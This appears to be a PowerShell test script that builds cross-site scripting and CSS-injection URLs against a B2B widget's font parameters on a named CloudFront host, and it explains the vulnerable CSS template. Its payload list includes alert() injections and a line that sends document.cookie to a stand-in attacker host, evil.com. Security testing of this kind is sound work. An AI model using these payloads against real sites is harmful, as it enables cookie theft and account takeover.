# Test XSS in B2B widget font parameters
$xss_payloads = @(
    "_fn='); alert(1); //",
    "_fn=test&_fo=test'); alert(document.domain);//",
    "_fd=sans-serif; } body { background: url('https://evil.com/steal?c=' %2B document.cookie); }"
)

Write-Host "=== Testing XSS in B2B Widget ===" -ForegroundColor Cyan

foreach ($payload in $xss_payloads) {
    $url = "https://d2pneqdaei3b3x.cloudfront.net/index.html?$payload"
    Write-Host "`nPayload: $payload" -ForegroundColor Yellow
    Write-Host "URL: $url"
}

# The widget injects user input directly into CSS:
# @import url('https://fonts.googleapis.com/css2?family=${fontOpts}');
# body { font-family: '${fontName}', ${fontDefault};}

Write-Host "`n=== CSS Injection Analysis ===" -ForegroundColor Cyan
Write-Host "Vulnerable code pattern:"
Write-Host '@import url(''https://fonts.googleapis.com/css2?family=${fontOpts}'');'
Write-Host 'body { font-family: ''${fontName}'', ${fontDefault};}'
Write-Host "`nUser-controlled variables: _fn (fontName), _fo (fontOpts), _fd (fontDefault)"
